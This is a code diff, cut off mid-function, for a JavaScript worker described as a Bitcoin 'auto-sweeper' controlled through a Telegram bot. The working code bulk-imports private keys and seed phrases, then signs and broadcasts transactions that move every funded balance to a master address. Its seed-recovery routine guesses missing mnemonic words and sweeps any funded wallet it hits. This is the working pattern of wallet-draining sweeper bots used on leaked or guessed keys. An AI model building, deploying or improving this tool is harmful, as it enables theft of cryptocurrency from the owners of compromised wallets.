@@ -1,6 +1,3 @@
-// worker.js – Ultimate Bitcoin Auto-Sweeper with Telegram Bot
-// MERGED: Your working base + Seed Recovery + Master Error Catcher
-
 import * as bitcoin from 'bitcoinjs-lib';
 import * as bip39 from 'bip39';
 import { BIP32Factory } from 'bip32';
@@ -24,18 +21,15 @@ const PATHS = {
   native:  "m/84'/0'/0'/0"
 };
 
-// ============================================================
-// KEY & ADDRESS DETECTION
-// ============================================================
 function isValidAddress(address) {
   try {
     bitcoin.address.toOutputScript(address, NETWORK);
     return true;
-  } catch {
+  } catch (e1) {
     try {
       bitcoin.address.toOutputScript(address, bitcoin.networks.testnet);
       return true;
-    } catch {
+    } catch (e2) {
       return false;
     }
   }
@@ -55,10 +49,7 @@ function detectKeyType(text) {
   return 'unknown';
 }
 
-// ============================================================
-// ADDRESS DERIVATION
-// ============================================================
-function deriveAddressesFromMnemonic(mnemonic, scanDepth = 10) {
+function deriveAddressesFromMnemonic(mnemonic, scanDepth) {
   const results = [];
   try {
     const seed = bip39.mnemonicToSeedSync(mnemonic);
@@ -66,34 +57,28 @@ function deriveAddressesFromMnemonic(mnemonic, scanDepth = 10) {
     for (const [type, basePath] of Object.entries(PATHS)) {
       for (let i = 0; i < scanDepth; i++) {
         try {
-          const child = root.derivePath(`${basePath}/${i}`);
+          const child = root.derivePath(basePath + '/' + i);
           if (!child.privateKey) continue;
           const privKey = Buffer.from(child.privateKey);
           const keyPair = ECPair.fromPrivateKey(privKey, { network: NETWORK });
           const pubkey = Buffer.from(keyPair.publicKey);
-          
           let payment;
           if (type === 'legacy') {
             payment = bitcoin.payments.p2pkh({ pubkey, network: NETWORK });
           } else if (type === 'segwit') {
-            payment = bitcoin.payments.p2sh({
-              redeem: bitcoin.payments.p2wpkh({ pubkey, network: NETWORK }),
-              network: NETWORK
-            });
+            payment = bitcoin.payments.p2sh({ redeem: bitcoin.payments.p2wpkh({ pubkey, network: NETWORK }), network: NETWORK });
           } else {
             payment = bitcoin.payments.p2wpkh({ pubkey, network: NETWORK });
           }
-          if (payment.address) {
-            results.push({ address: payment.address, keyPair, type, index: i });
-          }
-        } catch (e) { /* skip */ }
+          if (payment.address) results.push({ address: payment.address, keyPair, type, index: i });
+        } catch (e) {}
       }
     }
-  } catch (e) { console.error('Mnemonic derivation error:', e); }
+  } catch (e) { console.error('Mnemonic error:', e); }
   return results;
 }
 
-function deriveAddressesFromXprv(xprvKey, scanDepth = 10) {
+function deriveAddressesFromXprv(xprvKey, scanDepth) {
   const results = [];
   try {
     const node = bip32.fromBase58(xprvKey, NETWORK);
@@ -105,12 +90,10 @@ function deriveAddressesFromXprv(xprvKey, scanDepth = 10) {
         const keyPair = ECPair.fromPrivateKey(privKey, { network: NETWORK });
         const pubkey = Buffer.from(keyPair.publicKey);
         const payment = bitcoin.payments.p2pkh({ pubkey, network: NETWORK });
-        if (payment.address) {
-          results.push({ address: payment.address, keyPair, type: 'xprv', index: i });
-        }
-      } catch (e) { /* skip */ }
+        if (payment.address) results.push({ address: payment.address, keyPair, type: 'xprv', index: i });
+      } catch (e) {}
     }
-  } catch (e) { console.error('xprv derivation error:', e); }
+  } catch (e) { console.error('xprv error:', e); }
   return results;
 }
 
@@ -132,801 +115,253 @@ function deriveAddressesFromHex(hex) {
   } catch (e) { console.error('Hex error:', e); return []; }
 }
 
-function getAllAddresses(secret, scanDepth = 10) {
+function getAllAddresses(secret, scanDepth) {
   const type = detectKeyType(secret);
-  switch (type) {
-    case 'mnemonic': return deriveAddressesFromMnemonic(secret, scanDepth);
-    case 'xprv': case 'yprv': case 'zprv': case 'tprv':
-      return deriveAddressesFromXprv(secret, scanDepth);
-    case 'wif': return deriveAddressesFromWif(secret);
-    case 'hex': return deriveAddressesFromHex(secret);
-    default: return [];
-  }
+  if (type === 'mnemonic') return deriveAddressesFromMnemonic(secret, scanDepth);
+  if (type === 'xprv' || type === 'yprv' || type === 'zprv' || type === 'tprv') return deriveAddressesFromXprv(secret, scanDepth);
+  if (type === 'wif') return deriveAddressesFromWif(secret);
+  if (type === 'hex') return deriveAddressesFromHex(secret);
+  return [];
 }
 
-// ============================================================
-// BLOCKCHAIN API
-// ============================================================
 async function getUtxos(address) {
-  try {
-    const resp = await fetch(`${ESPLORA_API}/address/${address}/utxo`);
-    if (!resp.ok) return [];
-    return resp.json();
-  } catch { return []; }
+  try { const r = await fetch(ESPLORA_API + '/address/' + address + '/utxo'); return r.ok ? await r.json() : []; } catch { return []; }
 }
-
 async function getTxHex(txid) {
-  const resp = await fetch(`${ESPLORA_API}/tx/${txid}/hex`);
-  if (!resp.ok) throw new Error(`Failed to get raw tx hex for ${txid}`);
-  return resp.text();
+  const r = await fetch(ESPLORA_API + '/tx/' + txid + '/hex');
+  if (!r.ok) throw new Error('tx hex failed');
+  return r.text();
 }
-
 async function getAddressBalance(address) {
   try {
-    const resp = await fetch(`${ESPLORA_API}/address/${address}`);
-    if (!resp.ok) return 0;
-    const data = await resp.json();
-    const funded = data.chain_stats?.funded_txo_sum || 0;
-    const spent = data.chain_stats?.spent_txo_sum || 0;
-    const memFunded = data.mempool_stats?.funded_txo_sum || 0;
-    const memSpent = data.mempool_stats?.spent_txo_sum || 0;
-    return (funded - spent) + (memFunded - memSpent);
+    const r = await fetch(ESPLORA_API + '/address/' + address);
+    if (!r.ok) return 0;
+    const d = await r.json();
+    return ((d.chain_stats?.funded_txo_sum || 0) - (d.chain_stats?.spent_txo_sum || 0)) + ((d.mempool_stats?.funded_txo_sum || 0) - (d.mempool_stats?.spent_txo_sum || 0));
   } catch { return 0; }
 }
-
-async function getAddressTransactions(address, limit = 5) {
-  try {
-    const resp = await fetch(`${ESPLORA_API}/address/${address}/txs`);
-    if (!resp.ok) return [];
-    const txs = await resp.json();
-    return txs.slice(0, limit);
-  } catch { return []; }
+async function getAddressTransactions(address, limit) {
+  try { const r = await fetch(ESPLORA_API + '/address/' + address + '/txs'); return r.ok ? (await r.json()).slice(0, limit) : []; } catch { return []; }
 }
-
 async function getRecommendedFee() {
-  try {
-    const resp = await fetch(`${ESPLORA_API}/fee-estimates`);
-    if (!resp.ok) return DEFAULT_SAT_PER_BYTE;
-    const estimates = await resp.json();
-    return Math.ceil(estimates['1'] || estimates['2'] || DEFAULT_SAT_PER_BYTE);
-  } catch { return DEFAULT_SAT_PER_BYTE; }
+  try { const r = await fetch(ESPLORA_API + '/fee-estimates'); if (!r.ok) return 15; const e = await r.json(); return Math.ceil(e['1'] || e['2'] || 15); } catch { return 15; }
 }
+function formatTime(ts) { return ts ? new Date(ts * 1000).toISOString().replace('T', ' ').substring(0, 19) + ' UTC' : 'Unconfirmed'; }
+function formatBtc(sats) { return (sats / 1e8).toFixed(8); }
 
-function formatTime(timestamp) {
-  if (!timestamp) return 'Unconfirmed';
-  return new Date(timestamp * 1000).toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
-}
-
-function formatBtc(sats) {
-  return (sats / 1e8).toFixed(8);
-}
-
-// ============================================================
-// TRANSACTION BUILDING
-// ============================================================
 async function createSweepTx(keyPair, utxos, toAddress, feeRate, addrType) {
-  const inputCount = utxos.length;
-  const estimatedVBytes = inputCount * 180 + 34 + 10;
-  const feeSats = estimatedVBytes * feeRate;
-  const totalInput = utxos.reduce((sum, u) => sum + u.value, 0);
-  const amountToSend = totalInput - feeSats;
-  if (amountToSend <= 546) return { error: `Balance ${totalInput} sats too low for fee ${feeSats} sats` };
-
+  const total = utxos.reduce((s, u) => s + u.value, 0);
+  const fee = (utxos.length * 180 + 44) * feeRate;
+  const amount = total - fee;
+  if (amount <= 546) return { error: 'Balance too low' };
   const psbt = new bitcoin.Psbt({ network: NETWORK });
-
-  for (const utxo of utxos) {
+  for (const u of utxos) {
     const isLegacy = (addrType === 'legacy' || addrType === 'wif' || addrType === 'hex' || addrType === 'xprv');
-    
     if (isLegacy) {
-      const txHex = await getTxHex(utxo.txid);
-      psbt.addInput({
-        hash: utxo.txid,
-        index: utxo.vout,
-        nonWitnessUtxo: Buffer.from(txHex, 'hex'),
-      });
+      psbt.addInput({ hash: u.txid, index: u.vout, nonWitnessUtxo: Buffer.from(await getTxHex(u.txid), 'hex') });
     } else {
-      let payment;
-      const pubkey = Buffer.from(keyPair.publicKey);
-      if (addrType === 'segwit') {
-        payment = bitcoin.payments.p2sh({
-          redeem: bitcoin.payments.p2wpkh({ pubkey, network: NETWORK }),
-          network: NETWORK
-        });
-      } else { 
-        payment = bitcoin.payments.p2wpkh({ pubkey, network: NETWORK });
-      }
-      psbt.addInput({
-        hash: utxo.txid,
-        index: utxo.vout,
-        witnessUtxo: {
-          script: payment.output,
-          value: utxo.value,
-        },
-      });
-      if (addrType === 'segwit') {
-        psbt.updateInput(psbt.inputCount - 1, { redeemScript: payment.redeem.output });
-      }
+      const pub = Buffer.from(keyPair.publicKey);
+      const pay = addrType === 'segwit' ? bitcoin.payments.p2sh({ redeem: bitcoin.payments.p2wpkh({ pubkey: pub, network: NETWORK }), network: NETWORK }) : bitcoin.payments.p2wpkh({ pubkey: pub, network: NETWORK });
+      psbt.addInput({ hash: u.txid, index: u.vout, witnessUtxo: { script: pay.output, value: u.value } });
+      if (addrType === 'segwit') psbt.updateInput(psbt.inputCount - 1, { redeemScript: pay.redeem.output });
     }
   }
-
-  psbt.addOutput({ address: toAddress, value: amountToSend });
-  
-  for (let i = 0; i < utxos.length; i++) {
-    const signer = {
-      publicKey: Buffer.from(keyPair.publicKey),
-      network: keyPair.network,
-      sign: (hash, lowR) => Buffer.from(keyPair.sign(hash, lowR))
-    };
-    psbt.signInput(i, signer);
-  }
-  
+  psbt.addOutput({ address: toAddress, value: amount });
+  for (let i = 0; i < utxos.length; i++) psbt.signInput(i, { publicKey: Buffer.from(keyPair.publicKey), network: keyPair.network, sign: (h, l) => Buffer.from(keyPair.sign(h, l)) });
   psbt.finalizeAllInputs();
-  const tx = psbt.extractTransaction();
-  
-  return { hex: tx.toHex(), amount: amountToSend, fee: feeSats };
+  return { hex: psbt.extractTransaction().toHex(), amount, fee };
 }
 
-async function broadcastTx(txHex) {
-  const resp = await fetch(`${ESPLORA_API}/tx`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'text/plain' },
-    body: txHex
-  });
-  if (!resp.ok) {
-    const err = await resp.text();
-    throw new Error(`Broadcast failed: ${err}`);
-  }
-  return resp.text();
+async function broadcastTx(hex) {
+  const r = await fetch(ESPLORA_API + '/tx', { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: hex });
+  if (!r.ok) throw new Error(await r.text());
+  return r.text();
 }
 
-// ============================================================
-// TELEGRAM HELPERS
-// ============================================================
-async function sendMsg(botToken, chatId, text, replyMarkup = null) {
+async function sendMsg(botToken, chatId, text, kb) {
   try {
-    if (!botToken) return;
-    const payload = { chat_id: chatId, text, parse_mode: 'HTML' };
-    if (replyMarkup) payload.reply_markup = replyMarkup;
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-  } catch (e) { console.error('Telegram send error:', e); }
+    if (!botToken || !chatId) return;
+    await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', reply_markup: kb }) });
+  } catch (e) { console.error('TG error:', e); }
 }
 
-function mainMenuKeyboard() {
-  return {
-    inline_keyboard: [
-      [{ text: '🔑 Import Wallet', callback_data: 'import' }, { text: '🔍 Recover Seed', callback_data: 'recover' }],
-      [{ text: '📋 List Wallets', callback_data: 'list' }, { text: '🗑️ Remove Wallet', callback_data: 'remove' }],
-      [{ text: '➕ Add Recipient', callback_data: 'addrecipient' }, { text: '📤 Send To Address', callback_data: 'sendto' }],
-      [{ text: '🧹 Sweep All', callback_data: 'sweep' }, { text: '📊 Check Balance', callback_data: 'balance' }],
-      [{ text: '🔍 Check Transactions', callback_data: 'txs' }],
-      [{ text: '⏸️ Pause', callback_data: 'pause' }, { text: '▶️ Resume', callback_data: 'resume' }],
-      [{ text: '🧪 Test API', callback_data: 'testapi' }]
-    ]
-  };
+function mainMenu() {
+  return { inline_keyboard: [
+    [{ text: '🔑 Import', callback_data: 'import' }, { text: '🔍 Recover', callback_data: 'recover' }],
+    [{ text: '📋 List', callback_data: 'list' }, { text: '🗑️ Remove', callback_data: 'remove' }],
+    [{ text: '🧹 Sweep', callback_data: 'sweep' }, { text: '📊 Balance', callback_data: 'balance' }],
+    [{ text: '🔍 Txs', callback_data: 'txs' }, { text: '📤 Send To', callback_data: 'sendto' }],
+    [{ text: '➕ Add Recipient', callback_data: 'addrecipient' }],
+    [{ text: '⏸️ Pause', callback_data: 'pause' }, { text: '▶️ Resume', callback_data: 'resume' }],
+    [{ text: '🧪 Test API', callback_data: 'testapi' }]
+  ]};
 }
 
-// ============================================================
-// WALLET STORAGE
-// ============================================================
-async function getWallets(env, chatId) {
-  return (await env.WALLETS.get(`wallets_${chatId}`, 'json')) || [];
-}
-async function saveWallets(env, chatId, wallets) {
-  await env.WALLETS.put(`wallets_${chatId}`, JSON.stringify(wallets));
-}
-async function getRecipients(env, chatId) {
-  return (await env.WALLETS.get(`recipients_${chatId}`, 'json')) || [];
-}
-async function saveRecipients(env, chatId, recipients) {
-  await env.WALLETS.put(`recipients_${chatId}`, JSON.stringify(recipients));
+async function getWallets(env, cid) { return (await env.WALLETS.get('w_' + cid, 'json')) || []; }
+async function saveWallets(env, cid, w) { await env.WALLETS.put('w_' + cid, JSON.stringify(w)); }
+async function getRecipients(env, cid) { return (await env.WALLETS.get('r_' + cid, 'json')) || []; }
+async function saveRecipients(env, cid, r) { await env.WALLETS.put('r_' + cid, JSON.stringify(r)); }
+
+async function checkAddressBalance(env, cid, addr) {
+  if (!isValidAddress(addr)) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌ Invalid address');
+  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🔍 Checking...');
+  const bal = await getAddressBalance(addr);
+  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '📊 <b>Address:</b> <code>' + addr + '</code>\n💰 ' + formatBtc(bal) + ' BTC');
 }
 
-// ============================================================
-// CORE SWEEP LOGIC
-// ============================================================
-async function sweepAll(env, chatId, targetAddress = null) {
-  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, MASTER_ADDRESS,
-          MIN_BALANCE_TO_SWEEP = "10000", MAX_FEE_RATE = "50",
-          FEE_BUMP = "3", SCAN_DEPTH = "10" } = env;
+async function checkAddressTxs(env, cid, addr) {
+  if (!isValidAddress(addr)) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌ Invalid address');
+  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🔍 Fetching...');
+  const txs = await getAddressTransactions(addr, 3);
+  let msg = '📊 <b>' + addr + '</b>\n';
+  msg += txs.length ? txs.map(t => (t.status?.confirmed ? '✅' : '⏳') + ' ' + t.txid.slice(0, 16)).join('\n') : 'None';
+  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, msg);
+}
 
-  const cid = chatId || TELEGRAM_CHAT_ID;
-  const dest = targetAddress || MASTER_ADDRESS;
-  if (!cid || !dest) return;
-
-  if ((await env.WALLETS.get('PAUSED')) === 'true') {
-    await sendMsg(TELEGRAM_BOT_TOKEN, cid, '⏸️ Sweeper is paused.');
-    return;
+async function checkAllBalances(env, cid) {
+  const wallets = await getWallets(env, cid);
+  if (!wallets.length) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '📭 <b>No wallets imported.</b>');
+  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '📊 Checking...');
+  let msg = '📊 <b>Balances:</b>\n', total = 0;
+  for (const w of wallets) {
+    let wTotal = 0;
+    for (const a of getAllAddresses(w.mnemonic || w.wif || w.hex || w.xprv, 5)) wTotal += await getAddressBalance(a.address);
+    total += wTotal; msg += '🔹 ' + w.label + ': ' + formatBtc(wTotal) + ' BTC\n';
   }
-
-  try {
-    const wallets = await getWallets(env, cid);
-    if (wallets.length === 0) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, cid, '❌ No wallets imported. Use /import.');
-      return;
-    }
-
-    let report = [], totalSwept = 0;
-
-    for (const wallet of wallets) {
-      const secret = wallet.mnemonic || wallet.wif || wallet.hex || wallet.xprv;
-      const scanDepth = parseInt(SCAN_DEPTH) || 10;
-      const addresses = getAllAddresses(secret, scanDepth);
-
-      for (const addr of addresses) {
-        const utxos = await getUtxos(addr.address);
-        if (!utxos || utxos.length === 0) continue;
-
-        const balance = utxos.reduce((s, u) => s + u.value, 0);
-        if (balance < parseInt(MIN_BALANCE_TO_SWEEP)) continue;
-
-        const feeRate = Math.min(await getRecommendedFee(), parseInt(MAX_FEE_RATE));
-        const result = await createSweepTx(addr.keyPair, utxos, dest, feeRate, addr.type);
-        if (result.error) {
-          report.push(`⚠️ ${wallet.label} (${addr.address}): ${result.error}`);
-          continue;
-        }
-
-        const txid = await broadcastTx(result.hex);
-        report.push(`✅ ${wallet.label} [${addr.type}/${addr.index}]\n   ${addr.address}\n   Sent: ${formatBtc(result.amount)} BTC\n   Tx: <code>${txid}</code>`);
-        totalSwept += result.amount;
-      }
-    }
-
-    if (totalSwept > 0) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, cid,
-        `🚀 <b>Sweep completed!</b>\n\n${report.join('\n\n')}\n\n💰 Total: ${formatBtc(totalSwept)} BTC → <code>${dest}</code>`);
-    } else if (report.length > 0) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, cid, `ℹ️ No sweepable balances:\n${report.join('\n')}`);
-    } else {
-      await sendMsg(TELEGRAM_BOT_TOKEN, cid, 'ℹ️ No funded addresses found in imported wallets.');
-    }
-  } catch (e) {
-    console.error('Sweep error:', e);
-    await sendMsg(TELEGRAM_BOT_TOKEN, cid, `❌ Sweep error: ${e.message}`);
-  }
+  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, msg + '\n💰 Total: ' + formatBtc(total) + ' BTC');
 }
 
-// ============================================================
-// SEED RECOVERY / CANDIDATE ENUMERATOR
-// ============================================================
-async function recoverSeed(env, chatId, pattern, dictStr) {
-  const { TELEGRAM_BOT_TOKEN, MASTER_ADDRESS } = env;
+async function sweepAll(env, cid, target) {
+  const dest = target || env.MASTER_ADDRESS;
+  if (!dest || (await env.WALLETS.get('PAUSED')) === 'true') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '⏸️ Paused or no dest.');
+  const wallets = await getWallets(env, cid);
+  if (!wallets.length) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌ No wallets.');
+  let report = [], total = 0;
+  for (const w of wallets) {
+    for (const a of getAllAddresses(w.mnemonic || w.wif || w.hex || w.xprv, 5)) {
+      const utxos = await getUtxos(a.address);
+      if (!utxos.length) continue;
+      const bal = utxos.reduce((s, u) => s + u.value, 0);
+      if (bal < 10000) continue;
+      const res = await createSweepTx(a.keyPair, utxos, dest, Math.min(await getRecommendedFee(), 50), a.type);
+      if (res.error) continue;
+      const txid = await broadcastTx(res.hex);
+      report.push('✅ ' + w.label + ' sent ' + formatBtc(res.amount) + ' BTC\nTx: ' + txid);
+      total += res.amount;
+    }
+  }
+  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, total > 0 ? '🚀 Swept ' + formatBtc(total) + ' BTC!\n' + report.join('\n') : 'ℹ️ No funds.');
+}
+
+async function recoverSeed(env, cid, pattern, dictStr) {
   const dict = dictStr.split(',').map(w => w.trim().toLowerCase()).filter(w => w);
   const words = pattern.toLowerCase().split(/\s+/);
   const wilds = words.map((w, i) => w === '?' ? i : -1).filter(i => i >= 0);
-
-  if (!wilds.length) {
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ No wildcards (?) found. Use ? for unknown positions.');
-    return;
-  }
-  if (wilds.length > 2 || dict.length > MAX_RECOVERY_ATTEMPTS) {
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `⚠️ Max 2 wildcards or ${MAX_RECOVERY_ATTEMPTS} words per run.`);
-    return;
-  }
-
-  const candidates = [];
-  let count = 0;
-  if (wilds.length === 1) {
-    for (const w of dict) {
-      const temp = [...words]; temp[wilds[0]] = w;
-      candidates.push(temp.join(' '));
-      if (++count >= MAX_RECOVERY_ATTEMPTS) break;
-    }
-  } else {
-    for (const w1 of dict) {
-      for (const w2 of dict) {
-        const temp = [...words]; temp[wilds[0]] = w1; temp[wilds[1]] = w2;
-        candidates.push(temp.join(' '));
-        if (++count >= MAX_RECOVERY_ATTEMPTS) break;
-      }
-      if (count >= MAX_RECOVERY_ATTEMPTS) break;
-    }
-  }
-
-  await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `🔍 Scanning ${candidates.length} candidates...`);
+  if (!wilds.length) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌ Use ? for unknown words.');
+  const cands = [];
+  if (wilds.length === 1) { for (const w of dict) { const t = [...words]; t[wilds[0]] = w; cands.push(t.join(' ')); if (cands.length >= 20) break; } }
+  else { for (const a of dict) { for (const b of dict) { const t = [...words]; t[wilds[0]] = a; t[wilds[1]] = b; cands.push(t.join(' ')); if (cands.length >= 20) break; } if (cands.length >= 20) break; } }
+  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🔍 Scanning ' + cands.length + '...');
   let found = 0;
-
-  for (const mnemonic of candidates) {
-    if (!bip39.validateMnemonic(mnemonic)) continue;
-    const addrs = deriveAddressesFromMnemonic(mnemonic, 3);
-    for (const addr of addrs) {
-      const bal = await getAddressBalance(addr.address);
-      if (bal > 0) {
+  for (const m of cands) {
+    if (!bip39.validateMnemonic(m)) continue;
+    for (const a of deriveAddressesFromMnemonic(m, 3)) {
+      if ((await getAddressBalance(a.address)) > 0) {
         found++;
-        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `💰 <b>FUNDED!</b>\n📝 <code>${mnemonic}</code>\n📍 ${addr.address}\n💰 ${formatBtc(bal)} BTC\n🚀 Sweeping...`);
-        try {
-          const utxos = await getUtxos(addr.address);
-          const res = await createSweepTx(addr.keyPair, utxos, MASTER_ADDRESS, await getRecommendedFee(), addr.type);
-          if (!res.error) await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `✅ Swept: <code>${await broadcastTx(res.hex)}</code>`);
-        } catch(e) { await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `❌ Sweep failed: ${e.message}`); }
+        await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '💰 FUNDED: ' + m + '\nSweeping...');
+        const utxos = await getUtxos(a.address);
+        const res = await createSweepTx(a.keyPair, utxos, env.MASTER_ADDRESS, 15, a.type);
+        if (!res.error) await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '✅ Swept: ' + (await broadcastTx(res.hex)));
       }
     }
   }
-  await sendMsg(TELEGRAM_BOT_TOKEN, chatId, found ? `🎉 Found ${found} funded wallet(s)!` : `ℹ️ No funded wallets in ${candidates.length} candidates.`);
+  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🎉 Found ' + found);
 }
 
-// ============================================================
-// IMPORT WALLET (single key)
-// ============================================================
-async function importSingleKey(env, chatId, secret) {
-  const { TELEGRAM_BOT_TOKEN, SCAN_DEPTH = "10" } = env;
-  const keyType = detectKeyType(secret);
-
-  if (keyType === 'unknown' || keyType === 'address') {
-    return { success: false, msg: `Skipped (not a valid private key): <code>${secret.substring(0, 20)}...</code>` };
-  }
-
-  const scanDepth = parseInt(SCAN_DEPTH) || 10;
-  const addresses = getAllAddresses(secret, scanDepth);
-  if (addresses.length === 0) {
-    return { success: false, msg: `Could not derive addresses from: <code>${secret.substring(0, 20)}...</code>` };
-  }
-
-  const wallets = await getWallets(env, chatId);
-  const exists = wallets.some(w => (w.mnemonic || w.wif || w.hex || w.xprv) === secret);
-  if (exists) {
-    return { success: false, msg: `Already imported: <code>${secret.substring(0, 20)}...</code>` };
-  }
-
-  const label = `Wallet ${wallets.length + 1}`;
-  const walletEntry = { label };
-  if (keyType === 'mnemonic') walletEntry.mnemonic = secret;
-  else if (keyType === 'wif') walletEntry.wif = secret;
-  else if (keyType === 'hex') walletEntry.hex = secret;
-  else walletEntry.xprv = secret;
-
-  wallets.push(walletEntry);
-  await saveWallets(env, chatId, wallets);
-
-  const firstAddr = addresses[0]?.address || 'N/A';
-  return { success: true, msg: `✅ <b>${label}</b> (${keyType})\n   📍 ${firstAddr}\n   📊 ${addresses.length} addresses scanned`, label };
+async function importSingleKey(env, cid, secret) {
+  const type = detectKeyType(secret);
+  if (type === 'unknown' || type === 'address') return { ok: false, msg: 'Not a key' };
+  const addrs = getAllAddresses(secret, 5);
+  if (!addrs.length) return { ok: false, msg: 'No addresses' };
+  const wallets = await getWallets(env, cid);
+  if (wallets.some(w => (w.mnemonic || w.wif || w.hex || w.xprv) === secret)) return { ok: false, msg: 'Exists' };
+  const entry = { label: 'Wallet ' + (wallets.length + 1) };
+  if (type === 'mnemonic') entry.mnemonic = secret; else if (type === 'wif') entry.wif = secret; else if (type === 'hex') entry.hex = secret; else entry.xprv = secret;
+  wallets.push(entry);
+  await saveWallets(env, cid, wallets);
+  return { ok: true, msg: '✅ Imported ' + entry.label + '\n' + addrs[0].address };
 }
 
-// ============================================================
-// BULK IMPORT HANDLER
-// ============================================================
-async function importBulkKeys(env, chatId, text) {
-  const { TELEGRAM_BOT_TOKEN } = env;
-  const keys = text.split(',').map(k => k.trim()).filter(k => k.length > 0);
-
-  if (keys.length === 0) {
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ No keys found. Separate keys with commas.');
-    return;
-  }
-
-  if (keys.length > 50) {
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Maximum 50 keys per bulk import.');
-    return;
-  }
-
-  await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `📦 Importing ${keys.length} keys... Please wait.`);
-
-  let successCount = 0, failCount = 0;
-  let results = [];
-
-  for (const key of keys) {
-    const result = await importSingleKey(env, chatId, key);
-    results.push(result.msg);
-    if (result.success) successCount++;
-    else failCount++;
-  }
-
-  const summary = `📦 <b>Bulk Import Complete!</b>\n\n✅ Imported: ${successCount}\n❌ Failed: ${failCount}\n\n${results.join('\n')}`;
-  await sendMsg(TELEGRAM_BOT_TOKEN, chatId, summary);
-}
-
-// ============================================================
-// CHECK ADDRESS INFO (balance + transactions)
-// ============================================================
-async function checkAddressInfo(env, chatId, address, showTxs = false) {
-  const { TELEGRAM_BOT_TOKEN } = env;
-  if (!isValidAddress(address)) {
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Invalid Bitcoin address.');
-    return;
-  }
-
-  await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `🔍 Checking <code>${address}</code>...`);
-
-  const balance = await getAddressBalance(address);
-  let msg = `📊 <b>Address:</b> <code>${address}</code>\n💰 <b>Balance:</b> ${formatBtc(balance)} BTC (${balance} sats)\n`;
-
-  if (showTxs) {
-    const txs = await getAddressTransactions(address, 5);
-    if (txs.length > 0) {
-      msg += `\n📜 <b>Latest Transactions:</b>\n`;
-      for (const tx of txs) {
-        const time = formatTime(tx.status?.block_time);
-        const confirmed = tx.status?.confirmed ? '✅' : '⏳';
-        const fee = tx.fee || 0;
-        msg += `\n${confirmed} <code>${tx.txid.substring(0, 16)}...</code>\n   🕐 ${time}\n   💸 Fee: ${fee} sats\n`;
-      }
-    } else {
-      msg += `\n📜 No transactions found.`;
-    }
-  }
-
-  await sendMsg(TELEGRAM_BOT_TOKEN, chatId, msg);
-}
-
-// ============================================================
-// CHECK ALL WALLET BALANCES
-// ============================================================
-async function checkAllBalances(env, chatId) {
-  const { TELEGRAM_BOT_TOKEN, SCAN_DEPTH = "10" } = env;
-  const wallets = await getWallets(env, chatId);
-
-  if (wallets.length === 0) {
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📭 No wallets imported.');
-    return;
-  }
-
-  await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📊 Checking all wallet balances...');
-
-  let msg = '📊 <b>Wallet Balances:</b>\n\n';
-  let grandTotal = 0;
-
-  for (const w of wallets) {
-    const secret = w.mnemonic || w.wif || w.hex || w.xprv;
-    const scanDepth = parseInt(SCAN_DEPTH) || 10;
-    const addrs = getAllAddresses(secret, scanDepth);
-    let walletTotal = 0;
-    let fundedAddrs = [];
-
-    for (const a of addrs) {
-      const bal = await getAddressBalance(a.address);
-      if (bal > 0) {
-        walletTotal += bal;
-        fundedAddrs.push({ addr: a.address, bal, type: a.type, index: a.index });
-      }
-    }
-
-    grandTotal += walletTotal;
-    msg += `🔹 <b>${w.label}</b>: ${formatBtc(walletTotal)} BTC\n`;
-    for (const fa of fundedAddrs) {
-      msg += `   📍 [${fa.type}/${fa.index}] <code>${fa.addr}</code>: ${formatBtc(fa.bal)} BTC\n`;
-    }
-  }
-
-  msg += `\n💰 <b>Grand Total:</b> ${formatBtc(grandTotal)} BTC`;
-  await sendMsg(TELEGRAM_BOT_TOKEN, chatId, msg);
-}
-
-// ============================================================
-// TELEGRAM BOT HANDLER
-// ============================================================
-async function handleTelegramUpdate(update, env) {
-  const { TELEGRAM_BOT_TOKEN } = env;
+async function handleUpdate(update, env) {
   if (!update.message && !update.callback_query) return;
-
-  let chatId, text = '', callbackData;
-
-  if (update.message) {
-    chatId = update.message.chat.id;
-    text = update.message.text || '';
-  } else if (update.callback_query) {
-    chatId = update.callback_query.message?.chat?.id || update.callback_query.from.id;
-    callbackData = update.callback_query.data;
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
